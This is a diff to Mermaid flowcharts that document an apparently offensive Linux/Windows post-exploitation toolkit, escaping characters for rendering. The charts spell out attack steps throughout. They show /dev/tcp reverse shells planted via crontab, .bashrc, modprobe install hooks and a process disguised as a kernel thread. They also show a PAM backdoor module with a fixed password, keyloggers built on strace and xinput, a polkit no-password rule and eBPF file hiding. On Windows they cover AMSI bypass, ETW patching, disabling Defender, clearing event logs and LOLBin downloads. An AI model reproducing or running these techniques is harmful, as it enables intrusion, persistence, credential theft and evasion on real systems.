@@ -298,7 +298,7 @@ flowchart TD
     A["crontab()"] --> B{"Custom command?"}
     B -->|Yes| C["read custom command"]
     B -->|No| D["read IP + port"]
-    D --> E["Build reverse shell:<br>/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"]
+    D --> E["Build reverse shell:<br>/bin/bash -c 'bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'"]
     C --> F["Append to /etc/crontab:<br>* * * * * root COMMAND"]
     E --> F
     F --> G["tee -a /etc/crontab > /dev/null"]
@@ -395,7 +395,7 @@ flowchart TD
 flowchart TD
     A["bashRCPersistence()"] --> B["read IP address"]
     B --> C["read port"]
-    C --> D["Build payload:<br>/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"]
+    C --> D["Build payload:<br>/bin/bash -c 'bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'"]
     D --> E{"For each /home/* directory"}
     E --> F{"Is directory?"}
     F -->|No| E
@@ -1368,7 +1368,7 @@ flowchart TD
     B -->|Yes| C{"gcc available?<br>pam headers present?"}
     C -->|No| Z2["Exit: install gcc + libpam0g-dev"]
     C -->|Yes| D["read backdoor_password"]
-    D --> E["Write C source (heredoc):<br>#include <security/pam_modules.h><br>pam_sm_authenticate():<br>  if (strcmp(password, BACKDOOR) == 0)<br>    return PAM_SUCCESS;<br>  return PAM_AUTH_ERR;"]
+    D --> E["Write C source heredoc:<br>#include #lt;security/pam_modules.h#gt;<br>pam_sm_authenticate:<br>  if strcmp password BACKDOOR == 0<br>    return PAM_SUCCESS<br>  return PAM_AUTH_ERR"]
     E --> F["sed substitute PASSWORD placeholder"]
     F --> G{"Detect PAM directory:<br>/lib/x86_64-linux-gnu/security/<br>/lib/security/<br>/lib64/security/"}
     G --> H["gcc -shared -fPIC -o pam_backdoor.so"]
@@ -1435,7 +1435,7 @@ flowchart TD
     C -->|1| D1["script -q -t /var/tmp/.tty_log<br>Captures all terminal I/O"]
     C -->|2| D2["xinput list → find keyboard ID<br>xinput test ID | tee logfile<br>Captures X11 keystrokes"]
     C -->|3| D3["PAM module logs credentials<br>to hidden file on every auth"]
-    C -->|4| D4["strace -p PID -e read<br>-s 1024 2>&1 | grep 'read(0'<br>Captures stdin of target process"]
+    C -->|4| D4["strace -p PID -e read<br>-s 1024 2#gt;#amp;1 pipe grep read 0<br>Captures stdin of target process"]
     C -->|5| D5["Create systemd service:<br>ExecStart=script/strace-based<br>keylogger running as daemon"]
 
     style A fill:#ff4444,color:#fff
@@ -1511,7 +1511,7 @@ flowchart TD
     A["procname.sh"] --> B["read process name"]
     B --> C["read IP"]
     C --> D["read PORT"]
-    D --> E["setsid /bin/bash -c<br>'exec -a PROCNAME /bin/bash<br>>& /dev/tcp/IP/PORT 0>&1 &'"]
+    D --> E["setsid /bin/bash -c<br>'exec -a PROCNAME /bin/bash<br>#gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1 #amp;'"]
     E --> F["Reverse shell running as<br>process named PROCNAME<br>(e.g. '[kworker/0:0]')"]
 
     style A fill:#ff4444,color:#fff
@@ -2086,8 +2086,8 @@ flowchart TD
     A["polkit_backdoor.sh"] --> B{"EUID == 0?"}
     B -->|No| Z["Exit"]
     B -->|Yes| C{"Detect polkit version"}
-    C -->|"≥0.106 (JS)"| D["Select:<br>1. JS rule (any action)<br>2. JS rule (specific action)<br>3. Cleanup"]
-    C -->|"<0.106 (pkla)"| E["Select:<br>1. .pkla rule (any action)<br>2. .pkla rule (specific)<br>3. Cleanup"]
+    C -->|"ge 0.106 JS"| D["Select:<br>1. JS rule any action<br>2. JS rule specific action<br>3. Cleanup"]
+    C -->|"lt 0.106 pkla"| E["Select:<br>1. .pkla rule any action<br>2. .pkla rule specific<br>3. Cleanup"]
 
     D -->|1| F["Read username"]
     F --> G["Write /etc/polkit-1/rules.d/49-d3m0n-nopasswd.rules:<br>polkit.addRule(function(action,subject){<br>  if(subject.user=='USER') return YES;<br>});"]
@@ -2146,13 +2146,13 @@ flowchart TD
 flowchart TD
     A["ebpf_hide.sh"] --> B{"EUID == 0?"}
     B -->|No| Z["Exit"]
-    B -->|Yes| C{"Kernel ≥ 4.15?"}
+    B -->|Yes| C{"Kernel ge 4.15?"}
     C -->|No| Z1["Exit: eBPF not supported"]
     C -->|Yes| D["Select:<br>1. Install bcc-tools<br>2. bpftrace monitor<br>3. bcc-python hider<br>4. Clone ebpfkit<br>5. Clone TripleCross<br>6. Status"]
 
     D -->|1| E["apt install bpfcc-tools<br>bpftrace python3-bpfcc<br>linux-headers-$(uname -r)"]
 
-    D -->|2| F["bpftrace -e<br>'tracepoint:syscalls:sys_enter_getdents64<br>{printf(\"PID %d reading dir\\n\", pid)}'"]
+    D -->|2| F["bpftrace -e tracepoint<br>syscalls:sys_enter_getdents64<br>prints PID reading directory"]
 
     D -->|3| G["Generate bcc-python script:<br>attach_kprobe getdents64<br>filter entries matching PREFIX"]
     G --> G1["Run as daemon<br>save PID to /var/tmp/.d3m0n_ebpf_pid"]
@@ -2185,7 +2185,7 @@ flowchart TD
 
     C -->|1| D["Select module:<br>usb-storage, fuse,<br>bluetooth, snd-pcm, etc."]
     D --> E["Read LHOST, LPORT"]
-    E --> F["Write /etc/modprobe.d/d3m0n-MODULE.conf:<br>install MODULE /bin/bash -c<br>'nohup bash -i >& /dev/tcp/IP/PORT 0>&1 &';<br>/sbin/modprobe --ignore-install MODULE"]
+    E --> F["Write /etc/modprobe.d/d3m0n-MODULE.conf:<br>install MODULE /bin/bash -c<br>'nohup bash -i #gt;#amp; /dev/tcp/IP/PORT 0#gt;#amp;1'<br>/sbin/modprobe --ignore-install MODULE"]
     F --> G["Module loads normally<br>+ payload executes"]
 
     C -->|2| H["Read module + command"]
@@ -2343,7 +2343,7 @@ flowchart TD
     A["win_evasion.sh"] --> B["Select technique:<br>1. AMSI Bypass<br>2. Disable Windows Defender<br>3. ETW Patching<br>4. Event Log Clearing<br>5. LOLBin Proxy Execution<br>6. Timestomping<br>7. Parent PID Spoofing"]
 
     B -->|1| C1["3 variants:<br>a. Reflection amsiInitFailed = true<br>b. AmsiScanBuffer memory patch (0xC3 ret)<br>c. Obfuscated string assembly"]
-    B -->|2| C2["Set-MpPreference -DisableRealtimeMonitoring $true<br>Registry: DisableAntiSpyware = 1<br>Add-MpPreference -ExclusionPath C:\\"]
+    B -->|2| C2["Set-MpPreference -DisableRealtimeMonitoring $true<br>Registry: DisableAntiSpyware = 1<br>Add-MpPreference -ExclusionPath C drive root"]
     B -->|3| C3["Get EtwEventWrite address via<br>GetProcAddress(ntdll, 'EtwEventWrite')<br>VirtualProtect → Write 0xC3 (ret)"]
     B -->|4| C4["wevtutil cl Security/System/Application<br>or Stop-Service EventLog"]
     B -->|5| C5["mshta javascript:...<br>rundll32 javascript:...<br>regsvr32 /s /u scrobj.dll (Squiblydoo)<br>certutil -urlcache -split -f URL<br>msiexec /q /i URL"]
